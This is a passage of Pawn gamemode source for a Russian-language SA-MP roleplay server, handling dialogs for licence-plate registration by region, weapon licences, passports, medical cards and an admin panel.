				case 87: SetPVarInt(playerid, "Region", 88);
				case 88: SetPVarInt(playerid, "Region", 89);
				case 89: SetPVarInt(playerid, "Region", 90);
				case 90: SetPVarInt(playerid, "Region", 92);
				case 91: SetPVarInt(playerid, "Region", 93);
				case 92: SetPVarInt(playerid, "Region", 95);
				case 93: SetPVarInt(playerid, "Region", 96);
				case 94: SetPVarInt(playerid, "Region", 97);
				case 95: SetPVarInt(playerid, "Region", 98);
				case 96: SetPVarInt(playerid, "Region", 99);
				case 97: SetPVarInt(playerid, "Region", 102);
				case 98: SetPVarInt(playerid, "Region", 116);
				case 99: SetPVarInt(playerid, "Region", 118);
				case 100: SetPVarInt(playerid, "Region", 121);
				case 101: SetPVarInt(playerid, "Region", 123);
				case 102: SetPVarInt(playerid, "Region", 125);
				case 103: SetPVarInt(playerid, "Region", 138);
				case 104: SetPVarInt(playerid, "Region", 150);
				case 105: SetPVarInt(playerid, "Region", 152);
				case 106: SetPVarInt(playerid, "Region", 154);
				case 107: SetPVarInt(playerid, "Region", 159);
				case 108: SetPVarInt(playerid, "Region", 161);
				case 109: SetPVarInt(playerid, "Region", 163);
				case 110: SetPVarInt(playerid, "Region", 164);
				case 111: SetPVarInt(playerid, "Region", 173);
				case 112: SetPVarInt(playerid, "Region", 174);
				case 113: SetPVarInt(playerid, "Region", 177);
				case 114: SetPVarInt(playerid, "Region", 182);
				case 115: SetPVarInt(playerid, "Region", 197);
				case 116: SetPVarInt(playerid, "Region", 199);
				case 117:
					{
					SetPVarInt(playerid, "TypeNumber", 2);
					ShowPlayerDialog(playerid, D_VEHNUMBER+3, DIALOG_STYLE_LIST, "{f6e58d}Выбор региона:",
					"{ffffff}01\tРеспублика Адыгея\n\
					{ffffff}02\tРеспублика Башкортостан\n\
					{ffffff}03\tРеспублика Бурятия\n\
					{ffffff}04\tРеспублика Алтай\n\
					{ffffff}05\tРеспублика Дагестан\n\
					{ffffff}06\tРеспублика Ингушетия\n\
					{ffffff}07\tКабардино-Балкарская Республика\n\
					{ffffff}08\tРеспублика Калмыкия\n\
					{ffffff}09\tКарачаево-Черкесская Республика\n\
					{ffffff}10\tРеспублика Карелия\n\
					{ffffff}11\tРеспублика Коми\n\
					{ffffff}12\tРеспублика Марый Эл\n\
					{ffffff}13\tРеспублика Мордовия\n\
					{ffffff}14\tРеспублика Саха (Якутия)\n\
					{ffffff}15\tРеспублика Северная Осетия\n\
					{ffffff}16\tРеспублика Татарстан\n\
					{ffffff}17\tРеспублика Тыва (Тува)\n\
					{ffffff}18\tУдмуртская Республика\n\
					{ffffff}19\tРеспублика Хакасия\n\
					{ffffff}20\tЧеченская Республика\n\
					{ffffff}21\tЧувашская Республика\n\
					{ffffff}22\tАлтайский край\n\
					{ffffff}23\tКраснодарский край\n\
					{ffffff}24\tКрасноярский край\n\
					{ffffff}25\tПриморский край\n\
					{ffffff}26\tСтавропольский край\n\
					{ffffff}27\tХабаровский край\n\
					{ffffff}28\tАмурская область\n\
					{ffffff}29\tАрхангельская область\n\
					{ffffff}30\tАстраханская область\n\
					{ffffff}31\tБелгородская область\n\
					{ffffff}32\tБрянская область\n\
					{ffffff}33\tВладимирская область\n\
					{ffffff}34\tВолгоградская область\n\
					{ffffff}35\tВологодская область\n\
					{ffffff}36\tВоронежская область\n\
					{ffffff}37\tИвановская область\n\
					{ffffff}38\tИркутская область\n\
					{ffffff}39\tКалининградская область\n\
					{ffffff}40\tКалужская область\n\
					{ffffff}41\tКамчатская область\n\
					{ffffff}42\tКемеровская область\n\
					{ffffff}43\tКировская область\n\
					{ffffff}44\tКостромская область\n\
					{ffffff}45\tКурганская область\n\
					{ffffff}46\tКурская область\n\
					{ffffff}47\tЛенинградская область\n\
					{ffffff}48\tЛипецкая область\n\
					{ffffff}49\tМагаданская область\n\
					{ffffff}50\tМосковская область\n\
					{ffffff}51\tМурманская область\n\
					{ffffff}52\tНижегородская область\n\
					{ffffff}53\tНовгородская область\n\
					{ffffff}54\tНовосибирская область\n\
					{ffffff}55\tОмская область\n\
					{ffffff}56\tОренбургская область\n\
					{ffffff}57\tОрловская область\n\
					{ffffff}58\tПензенская област\n\
					{ffffff}59\tПермская область\n\
					{ffffff}60\tПсковская область\n\
					{ffffff}61\tРостовская область\n\
					{ffffff}62\tРязанская область\n\
					{ffffff}63\tСамарская область\n\
					{ffffff}64\tСаратовская область\n\
					{ffffff}65\tСахалинская область\n\
					{ffffff}66\tСвердловская область\n\
					{ffffff}67\tСмоленская область\n\
					{ffffff}68\tТамбовская область\n\
					{ffffff}69\tТверская область\n\
					{ffffff}70\tТомская область\n\
					{ffffff}71\tТульская область\n\
					{ffffff}72\tТюменская область\n\
					{ffffff}73\tУльяновская область\n\
					{ffffff}74\tЧелябинская область\n\
					{ffffff}75\tЧитинская область\n\
					{ffffff}76\tЯрославская область\n\
					{ffffff}77\tг. Москва\n\
					{ffffff}78\tг. Санкт-Петербург\n\
					{ffffff}79\tЕврейская автономная область\n\
					{ffffff}80\tАгинский Бурятский автономный округ\n\
					{ffffff}81\tКоми-Пермяцкий автономный округ\n\
					{ffffff}82\tКорякский автономный округ\n\
					{ffffff}83\tНенецкий автономнь округ\n\
					{ffffff}84\tТаймырский автономный округ\n\
					{ffffff}85\tУсть-Ордынский Бурятский автономный округ\n\
					{ffffff}86\tХанты-Мансийский автономный округ\n\
					{ffffff}87\tЧукотский автономный округ\n\
					{ffffff}88\tЭвенкийский автономный округ\n\
					{ffffff}89\tЯмало-Ненецкий автономный округ\n\
					{ffffff}90\tМосковская область\n\
					{ffffff}92\tСевастополь\n\
					{ffffff}93\tКраснодарский край\n\
					{ffffff}95\tЧеченская Республика\n\
					{ffffff}96\tСвердловская область\n\
					{ffffff}97\tг. Москва\n\
					{ffffff}98\tг. Санкт-Петербург\n\
					{ffffff}99\tг. Москва\n\
					{ffffff}102\tРеспублика Башкортостан\n\
					{ffffff}116\tРеспублика Татарстан\n\
					{ffffff}118\tУдмуртская Республика\n\
					{ffffff}121\tЧувашская Республика\n\
					{ffffff}123\tКраснодарский край\n\
					{ffffff}125\tПриморский край\n\
					{ffffff}138\tИркутская область\n\
					{ffffff}150\tМосковская область\n\
					{ffffff}152\tНижегородская область\n\
					{ffffff}154\tНовосибирская область\n\
					{ffffff}159\tПермская область\n\
					{ffffff}161\tРостовская область\n\
					{ffffff}163\tСамарская область\n\
					{ffffff}164\tСаратовская область\n\
					{ffffff}173\tУльяновская область\n\
					{ffffff}174\tЧелябинская область\n\
					{ffffff}177\tг. Москва\n\
					{ffffff}182\tКрым\n\
					{ffffff}197\tг. Москва\n\
					{ffffff}199\tг. Москва\n\
     				{FFCC00}назад", "Далее", "Отмена");
	  				}
				}
 		    ShowPlayerListOwnbaleCar(playerid, D_VEHNUMBER, "{f6e58d}Получение номеров");
		   }
		}
	case D_VEHNUMBER:
		{
			if(response)
			{
				new index = g_player_listitem[playerid][listitem];

				new rows, Cache: result, slot;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE number=-1 AND id=%d", index);
				result = mysql_query(dbHandle, STRING_GLOBAL);

				rows = cache_num_rows();

				if(rows)
				{
					slot = cache_get_field_content_int(0, "slot");
				}
				else
				{
					return SendClientMessage(playerid, C_RED, "На этом автомобиле уже есть номера"), cache_delete(result);
				}

	   			new vehicleid = PI[playerid][P_OWNABLE_CAR][slot-1];

				if(!IsValidVehicle(vehicleid))
					return SendClientMessage(playerid, C_RED, "Этот транспорт должен быть загружен");

				if(GetVehicleData(vehicleid, veh_slot) == 55)
					return SendClientMessage(playerid, C_RED, "Получить номера на грузовик нельзя");

                new Region_UK[16];
				new reg_uk = GetPVarString(playerid, "Region_UK", Region_UK, sizeof(Region_UK));
				new reg = GetPVarInt(playerid, "Region");
				if(GetPVarInt(playerid, "TypeNumber") == 2 && reg <= 9 )
				{
				    SetPVarInt(playerid, "NestReg", 1);
				}
				else if(GetPVarInt(playerid, "TypeNumber") == 7 && reg <= 9 )
				{
				    SetPVarInt(playerid, "KzReg", 1);
				}
				new type = GetPVarInt(playerid, "TypeNumber");
				new number[144];

				if(GetPVarInt(playerid, "TypeNumber") == 6)
				{
					format(number, sizeof number, "%s %d%d%d%d %s%s", reg_uk, random(9), random(9), random(9), random(9), VehNumber_ua(), VehNumber_ua());
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}

				if(GetPVarInt(playerid, "TypeNumber") == 7 && GetPVarInt(playerid, "KzReg") == 1)
				{
					format(number, sizeof number, "%d%d%d%s%s%s0%d", random(9), random(9), random(9), VehNumber_kz(), VehNumber_kz(), VehNumber_kz(), reg);
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}

				if(GetPVarInt(playerid, "TypeNumber") == 7)
				{
					format(number, sizeof number, "%d%d%d%s%s%s%d", random(9), random(9), random(9), VehNumber_kz(), VehNumber_kz(), VehNumber_kz(), reg);
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}

				if(GetPVarInt(playerid, "TypeNumber") == 2 && GetPVarInt(playerid, "NestReg") == 1)
				{
					format(number, sizeof number, "%s%d%d%d%s%s0%d", VehNumber(), random(9), random(9), random(9), VehNumber(), VehNumber(), reg);
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}
				else if(GetPVarInt(playerid, "TypeNumber") == 2)
				{
					format(number, sizeof number, "%s%d%d%d%s%s%d", VehNumber(), random(9), random(9), random(9), VehNumber(), VehNumber(), reg);
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}
				else if(GetPVarInt(playerid, "TypeNumber") == 5)
				{
					format(number, sizeof number, "%d%d%d%d%s%s-%d",  random(9), random(9), random(9), random(9),VehNumber_by(), VehNumber_by(), reg);
					strmid(g_vehicle[vehicleid][veh_number], number, 0, strlen(number), 64);
				}
				g_vehicle[vehicleid][veh_type_num] = type;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[Пункт выдачи номеров] %s[%i] зарегистрировал номер %s на авто %s (%d)", GetName(playerid), playerid, number, g_vehicle_info[GetVehicleModel(vehicleid) - 400][VI_NAME], GetVehicleModel(vehicleid));
				foreach(new i: Player) if(IsADps(i)) SendClientMessage(i, 0x3399FFFF, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы получили гос.номера {FFFFFF}\"%s\" {0099FF}на свой транспорт %s", number, g_vehicle_info[GetVehicleModel(vehicleid) - 400][VI_NAME]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, STRING_GLOBAL);

				GiveMoney(playerid, -10000);

				SetVehicleNumberPlate(vehicleid, g_vehicle[vehicleid][veh_number]);
				SendVehicleNumberPlate(playerid, vehicleid, 2, g_vehicle[vehicleid][veh_number]);

				STRING_GLOBAL[0] = EOS;

				mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE `ownable_cars` SET `number` = '%s', `type_number` = '%d'  WHERE `id` = '%d' LIMIT 1", g_vehicle[vehicleid][veh_number], g_vehicle[vehicleid][veh_type_num], g_vehicle[vehicleid][veh_sql_id]);
				mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

				DeletePVar(playerid, "KzReg");
				DeletePVar(playerid, "TypeNumber");
				DeletePVar(playerid, "Region");
				DeletePVar(playerid, "NestReg");
				DeletePVar(playerid, "Region_UK");
			}
		}
	case D_VEHNUMBER+2:
	{
		if(response)
		{
		    switch(listitem)
		    {
		        case 0..6: SetPVarInt(playerid, "Region", listitem + 1);
			}
			ShowPlayerListOwnbaleCar(playerid, D_VEHNUMBER, "{f6e58d}Получение номеров");
		}
	}
	case D_VEHNUMBER+4:
	{
		if(response)
		{
		    switch(listitem)
		    {
				case 0..15: SetPVarInt(playerid, "Region", listitem + 1);
			}
			ShowPlayerListOwnbaleCar(playerid, D_VEHNUMBER, "{f6e58d}Получение номеров");
		}
	}
	case D_VEHNUMBER+5:
	{
		if(response)
		{
		    switch(listitem)
		    {
				case 0: SetPVarString(playerid, "Region_UK", "ав");
				case 1: SetPVarString(playerid, "Region_UK", "ас");
				case 2: SetPVarString(playerid, "Region_UK", "ае");
				case 3: SetPVarString(playerid, "Region_UK", "ан");
				case 4: SetPVarString(playerid, "Region_UK", "ам");
				case 5: SetPVarString(playerid, "Region_UK", "ао");
				case 6: SetPVarString(playerid, "Region_UK", "ар");
				case 7: SetPVarString(playerid, "Region_UK", "ат");
				case 8: SetPVarString(playerid, "Region_UK", "аа");
				case 9: SetPVarString(playerid, "Region_UK", "аi");
				case 10: SetPVarString(playerid, "Region_UK", "ва");
				case 11: SetPVarString(playerid, "Region_UK", "вв");
				case 12: SetPVarString(playerid, "Region_UK", "вс");
				case 13: SetPVarString(playerid, "Region_UK", "ве");
				case 14: SetPVarString(playerid, "Region_UK", "вн");
				case 15: SetPVarString(playerid, "Region_UK", "вi");
				case 16: SetPVarString(playerid, "Region_UK", "вк");
				case 17: SetPVarString(playerid, "Region_UK", "вм");
				case 18: SetPVarString(playerid, "Region_UK", "во");
				case 19: SetPVarString(playerid, "Region_UK", "ах");
				case 20: SetPVarString(playerid, "Region_UK", "вт");
				case 21: SetPVarString(playerid, "Region_UK", "вх");
				case 22: SetPVarString(playerid, "Region_UK", "са");
				case 23: SetPVarString(playerid, "Region_UK", "св");
				case 24: SetPVarString(playerid, "Region_UK", "се");
   			}
			ShowPlayerListOwnbaleCar(playerid, D_VEHNUMBER, "{f6e58d}Получение номеров");
		}
	}



/*	case D_VEHNUMBER+1:
	{
		if(response)
		{
		    switch(listitem)
		    {
		        case 0..68: SetPVarInt(playerid, "Region", listitem + 1);
				case 69:
				{
					SetPVarInt(playerid, "TypeNumber", 2);
					ShowPlayerDialog(playerid, D_VEHNUMBER+1, DIALOG_STYLE_LIST, "{f6e58d}Выбор региона:",
				    "{ffffff}71\tТульская область\n\
					{ffffff}72\tТюменская область\n\
					{ffffff}73\tУльяновская область\n\
					{ffffff}74\tЧелябинская область\n\
					{ffffff}75\tЧитинская область\n\
					{ffffff}76\tЯрославская область\n\
					{ffffff}77\tг. Москва\n\
					{ffffff}78\tг. Санкт-Петербург\n\
					{ffffff}79\tЕврейская автономная область\n\
					{ffffff}80\tАгинский Бурятский автономный округ\n\
					{ffffff}81\tКоми-Пермяцкий автономный округ\n\
					{ffffff}82\tКорякский автономный округ\n\
					{ffffff}83\tНенецкий автономнь округ\n\
					{ffffff}84\tТаймырский автономный округ\n\
					{ffffff}85\tУсть-Ордынский Бурятский автономный округ\n\
					{ffffff}86\tХанты-Мансийский автономный округ\n\
					{ffffff}87\tЧукотский автономный округ\n\
					{ffffff}88\tЭвенкийский автономный округ\n\
					{ffffff}89\tЯмало-Ненецкий автономный округ\n\
					{ffffff}90\tМосковская область\n\
					{ffffff}92\tСевастополь\n\
					{ffffff}93\tКраснодарский край\n\
					{ffffff}95\tЧеченская Республика\n\
					{ffffff}96\tСвердловская область\n\
					{ffffff}97\tг. Москва\n\
					{ffffff}98\tг. Санкт-Петербург\n\
					{ffffff}99\tг. Москва\n\
					{ffffff}102\tРеспублика Башкортостан\n\
					{ffffff}116\tРеспублика Татарстан\n\
					{ffffff}118\tУдмуртская Республика\n\
					{ffffff}121\tЧувашская Республика\n\
					{ffffff}123\tКраснодарский край\n\
					{ffffff}125\tПриморский край\n\
					{ffffff}138\tИркутская область\n\
					{ffffff}150\tМосковская область\n\
					{ffffff}152\tНижегородская область\n\
					{ffffff}154\tНовосибирская область\n\
					{ffffff}159\tПермская область\n\
					{ffffff}161\tРостовская область\n\
					{ffffff}163\tСамарская область\n\
					{ffffff}164\tСаратовская область\n\
					{ffffff}173\tУльяновская область\n\
					{ffffff}174\tЧелябинская область\n\
					{ffffff}177\tг. Москва\n\
					{ffffff}182\tКрым\n\
					{ffffff}197\tг. Москва\n\
					{ffffff}199\tг. Москва\n\
					{FFCC00}назад", "Далее", "Отмена");
				}
			}
			ShowPlayerListOwnbaleCar(playerid, D_VEHNUMBER, "{f6e58d}Получение номеров");
		}
	}*/
	case D_POLMENU://ДПС
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
				{
				    if(g_player_skills[playerid][S_LICS][3]) return SendClientMessage(playerid, COLOR_GREY, "Вы уже имеете лицензию на владение оружием");
	    			else if(PI[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Для покупки лицензии необходимо иметь 3 уровень");
	    			else if(PhoneNumbers[playerid][2] < 2) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет мед. карты или вам запрещенно использовать оружие");
	    			ShowPlayerDialog(playerid, D_PASS+2, DIALOG_STYLE_MSGBOX, "Оформление лицензии", "\
					{FFFFFF}- Вас приветствует сотрудник {0055FF}Полиции\n\n\
					{FFFFFF}Желаете оформить лицензию на владение оружием?\n\
					Стоимость: {63BD4E}30000р", "Принять", "Отмена");
				}
		    }
		}
    case D_POLMENU+1:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0:
				{
				    if(g_player_skills[playerid][S_LICS][3]) return SendClientMessage(playerid, COLOR_GREY, "Вы уже имеете лицензию на владение оружием");
	    			else if(PI[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Для покупки лицензии необходимо иметь 3 уровень");
	    			else if(PhoneNumbers[playerid][2] < 2) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет мед. карты или вам запрещенно использовать оружие");
	    			ShowPlayerDialog(playerid, D_PASS+2, DIALOG_STYLE_MSGBOX, "Оформление лицензии", "{FFFFFF}- Вас приветствует сотрудник {0055FF}Полиции\n\n{FFFFFF}Желаете оформить лицензию на владение оружием?\nСтоимость: {63BD4E}30000р", "Принять", "Отмена");
				}
		    }
		}
	case D_PASS+2:
	    {
	        if(!response) return 1;
			if(GetMoney(playerid) < 100000) return SendMess(playerid, MSG_NOT_MONEY);
			GiveMoney(playerid, -100000);
			g_player_skills[playerid][S_LICS][3] = 1;
			ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, " ", "\
			\n\n{FFFFFF}Вы успешно оформили лицензию на оружие\n\
			Теперь Вам разрешено использовать оружие\n\n\
			{F04245}За несоблюдение законов и правил обращения с оружием,\n\
			у Вас его могут изъять, вместе с лицензией, а также\n\
			Вы можете понести наказание по уголовному кодексу.\n\n", "Ок", "");
	    }
  	case D_PASS+1:
	    {
	        if(!response) return 1;
	        switch(listitem)
		    {
			    case 0:
				{
				    if(PhoneNumbers[playerid][2] != 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже есть мед.карта!");
					PhoneNumbers[playerid][2] = 4;
					MysqlUpdatePlayerInt(playerid, "phnumber3", PhoneNumbers[playerid][2]);
					SendClientMessage(playerid, COLOR_GREEN, "Вы успешно получили мед. карту. Чтобы показать, используйте команду '/med'");
	   			}
			}
		}
    case D_PASS:
	    {
	        if(!response) return 1;
	        switch(listitem)
		    {
		        case 0:
				{
			        if(PhoneNumbers[playerid][1] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас уже есть паспорт!");
					if(GetMoney(playerid) < MP1[3]) return SendMess(playerid, MSG_NOT_MONEY);
					GiveMoney(playerid, MP1[3]);
					PhoneNumbers[playerid][1] = 100000 + random(900000);
					MysqlUpdatePlayerInt(playerid, "phnumber2", PhoneNumbers[playerid][1]);
					SendClientMessage(playerid, COLOR_GREEN, "Вы успешно получили паспорт. Чтобы показать, используйте команду /pass");
					FracBank[9] += MP1[3];
					MysqlUpdateOtherInt("sfnbank", FracBank[9]);
				}
			}
	    }
	case D_APANEL:
	    {
	        new l_item = listitem;

	        if(!strcmp(PI[playerid][pName], "Artemy_Kovalevsky", true))
	            l_item += 0;

	        if(!response) return 1;
	        switch(l_item)
	        {
	            case 0:
	            {
	                if(PI[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет доступа!");
				    new year, month, day, string[100];
				    new current_date = getdate(year, month, day);
					SendClientMessage(playerid, COLOR_BLUE, "VIP игроки:");
					foreach(new i: Player)
					{
						if(!PlayerLogged[i] || !PI[i][pVip]) continue;
						format(string, sizeof(string), "- %s[%i] (осталось дн.: %i)", GetName(i), i, PI[i][pVipTime] - current_date);
						SendClientMessage(playerid, COLOR_WHITE, string);
					}
	            }
	            case 1:
	            {
	                if(PI[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет доступа!");
				    new year, month, day;
				    new current_date = getdate(year, month, day);
					SendClientMessage(playerid, COLOR_BLUE, "Игроки с мутом:");
					foreach(new i: Player)
					{
						if(!PlayerLogged[i] || !PI[i][pMuted]) continue;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- %s[%i] (осталось: %i сек)", GetName(i), i, PI[i][pMuted] - current_date);
						SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);
					}
	            }
	            case 2:
	            {
	                if(PI[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет доступа!");
				    new year, month, day;
				    new current_date = getdate(year, month, day);
					SendClientMessage(playerid, COLOR_BLUE, "Игроки в тюрьме:");
					foreach(new i: Player)
					{
						if(!PlayerLogged[i] || !PI[i][pJail]) continue;

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- %s[%i] (осталось: %i сек)", GetName(i), i, PI[i][pJailTime] - current_date);
						SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);
					}
	            }
	            case 3: callcmd::admins(playerid);
				case 4:
	            {
	                if(IsPlayerGrandAdmin(playerid))
	                {
                    	mysql_tquery(dbHandle, "SELECT * FROM "T_ADMIN" WHERE level > '0'", "AllAdmins", "i", playerid);
                    }
	            }
				case 5:
	            {
	                if(PI[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет доступа!");
                    mysql_tquery(dbHandle, "SELECT * FROM "T_ACCOUNTS" WHERE leader > '0'", "Allleaders", "i", playerid);
	            }
	            case 6: callcmd::ahelp(playerid);
	            case 7:
	            {
	                if(PI[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет доступа!");

				    STRING_GLOBAL[0] = EOS;
				    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{ffffff}Телепорт к себе\t\t| %s\n{ffffff}Телепорт себя\t\t\t| %s\n{ffffff}Слежка за собой\t\t| %s\nИнформация",
					(AdminInfo[playerid][admGoto]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
					(AdminInfo[playerid][admGethere]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
					(AdminInfo[playerid][admSpectate]) ? ("{F04245}Запрещена") : ("{63BD4E}Разрешена"));
					ShowPlayerDialog(playerid, D_APANEL+3, 2, "Настройки администратора", STRING_GLOBAL, "Выбрать", "Назад");
	            }
	            case 8:
	            {
                    STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}Посещение за все время\t\t{FFFF00}%i\n", STRING_GLOBAL, MD[5]);
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}Посещение за сегодня\t\t{FFFF00}%i\n", STRING_GLOBAL, Conday[0]);
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}Посещение за час\t\t\t{FFFF00}%i\n", STRING_GLOBAL, Conday[1]);
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}Регистраций за сегодня\t\t{FFFF00}%i\n", STRING_GLOBAL, Conday[2]);
					ShowPlayerDialog(playerid, D_APANEL, DIALOG_STYLE_MSGBOX, "Инфорация сервера", STRING_GLOBAL, "Назад", "Закрыть");
	            }
	            case 9:
				{
				    if(IsPlayerDeveloperAdmin(playerid))
	                {
			    		ShowPlayerDialog(playerid, D_APANEL+5, DIALOG_STYLE_INPUT, "{11D2B5}Расформировать фракцию", "{FFFFFF}Введите ID фракции, которую необходимо расформировать:","ОК","Отмена");
					}
				}
	            case 10:
				{
				    if(IsPlayerDeveloperAdmin(playerid))
					{
					    STRING_GLOBAL[0] = EOS;
					    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{ffffff}Удвоение опыта\t\t| %s\n{ffffff}Удвоение доната\t\t| %s\n{ffffff}Удвоение зарплаты\t\t| %s\n",
						(!doubling_exp) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
						(!doubling_donate) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
						(!doubling_donate_x3) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
						(!doubling_job) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"));
						ShowPlayerDialog(playerid, D_APANEL+2, 2, "Управление сервером", STRING_GLOBAL, "Выбрать", "Назад");
					}
				}
	        }
	    }
	case D_APANEL+2:
	    {
	        if(!response)
			{
			    if(GetString(GetName(playerid), "Artemy_Kovalevsky")
			    || GetString(GetName(playerid), "Gambler"))
			        callcmd::apanel(playerid);
				else
				    callcmd::consoleconsole(playerid);

				return 1;
			}
	        switch(listitem)
	        {
	            case 0:
				{
					doubling_exp = (!doubling_exp) ? (1) : (0);
					MysqlUpdateOtherInt("d_exp", doubling_exp);
				}
	            case 1:
	            {
					doubling_donate = (!doubling_donate) ? (1) : (0);
					MysqlUpdateOtherInt("d_donate", doubling_donate);
				}
    			case 2:
	            {
					doubling_donate = (!doubling_donate_x3) ? (1) : (0);
					MysqlUpdateOtherInt("d_donate", doubling_donate_x3);
				}
				case 3:
	            {
					doubling_job = (!doubling_job) ? (1) : (0);
					MysqlUpdateOtherInt("d_jobik", doubling_job);
				}
	        }
	        STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{ffffff}Удвоение опыта:\t\t| %s\n{ffffff}Удвоение доната:\t\t| %s\n{ffffff}Удвоение зарплаты\t\t| %s\n",
			(!doubling_exp) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
			(!doubling_donate) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
			(!doubling_donate_x3) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"),
			(!doubling_job) ? ("{F04245}Выкл") : ("{63BD4E}Вкл"));
			ShowPlayerDialog(playerid, D_APANEL+2, 2, "Управление сервером", STRING_GLOBAL, "Выбрать", "Назад");
	    }
	case D_APANEL+3:
	    {
	        if(!response)
	        {
				callcmd::apanel(playerid);
				return 1;
	        }
	        if(listitem < 3)
	        {
		        switch(listitem)
		        {
		            case 0:
					{
						AdminInfo[playerid][admGoto] = (!AdminInfo[playerid][admGoto]) ? (1) : (0);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET a_goto='%d' WHERE name='%s' LIMIT 1", AdminInfo[playerid][admGoto], GetName(playerid));
						mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					}
		            case 1:
		            {
						AdminInfo[playerid][admGethere] = (!AdminInfo[playerid][admGethere]) ? (1) : (0);

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET a_gethere='%d' WHERE name='%s' LIMIT 1", AdminInfo[playerid][admGoto], GetName(playerid));
						mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					}
					case 2:
					{
					    AdminInfo[playerid][admSpectate] = (!AdminInfo[playerid][admSpectate]) ? (1) : (0);

					    STRING_GLOBAL[0] = EOS;
					    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET a_spec='%d' WHERE name='%s' LIMIT 1", AdminInfo[playerid][admGoto], GetName(playerid));
						mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					}
		        }
		        STRING_GLOBAL[0] = EOS;
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{ffffff}Телепорт к себе\t\t| %s\n{ffffff}Телепорт себя\t\t\t| %s\n{ffffff}Слежка за собой\t\t| %s\nИнформация",
				(AdminInfo[playerid][admGoto]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
				(AdminInfo[playerid][admGethere]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
				(AdminInfo[playerid][admSpectate]) ? ("{F04245}Запрещена") : ("{63BD4E}Разрешена"));
				ShowPlayerDialog(playerid, D_APANEL+3, 2, "Настройки администратора", STRING_GLOBAL, "Выбрать", "Назад");
			}
			else
			{
			    switch(listitem)
				{
				    case 3: ShowPlayerDialog(playerid, D_APANEL+4, 0, "Информация", "{FFFFFF}Данные запреты действуют только на администраторов младше 5 уровня.", "Назад", "");
				}
			}
	    }
	case D_APANEL+4:
	    {
	        if(response)
	        {
	            STRING_GLOBAL[0] = EOS;
	            format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{ffffff}Телепорт к себе\t\t| %s\n{ffffff}Телепорт себя\t\t\t| %s\n{ffffff}Слежка за собой\t\t| %s\nИнформация",
				(AdminInfo[playerid][admGoto]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
				(AdminInfo[playerid][admGethere]) ? ("{F04245}Запрещён") : ("{63BD4E}Разрешён"),
				(AdminInfo[playerid][admSpectate]) ? ("{F04245}Запрещена") : ("{63BD4E}Разрешена"));
				ShowPlayerDialog(playerid, D_APANEL+3, 2, "Настройки администратора", STRING_GLOBAL, "Выбрать", "Назад");
	        }
	    }
   	case D_APANEL+5:
		{
			STRING_GLOBAL[0] = EOS;
